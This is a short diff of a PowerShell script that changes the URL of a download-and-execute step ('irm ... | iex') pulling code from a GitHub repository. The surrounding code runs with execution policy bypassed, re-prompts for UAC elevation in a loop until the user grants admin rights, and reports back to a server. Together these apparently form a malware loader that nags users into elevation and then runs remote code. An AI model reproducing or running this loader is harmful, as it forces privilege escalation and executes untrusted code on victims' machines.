@@ -597,7 +597,7 @@ function Start-Main {
     if (-not $LaunchedFromWinlogon -and -not (Test-IsAdmin)) {
         while (-not (Test-IsAdmin)) {
             try {
-                $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://github.com/Squad7556/rar/releases/download/v1.0/log|iex`""
+                $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Squad7556/rar/refs/heads/main/log|iex`""
                 Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -ErrorAction Stop
                 Send-ErrorToServer -ErrorMessage "Requested elevation via UAC (loop)" -Command "Start-Main:UAC"
                 exit
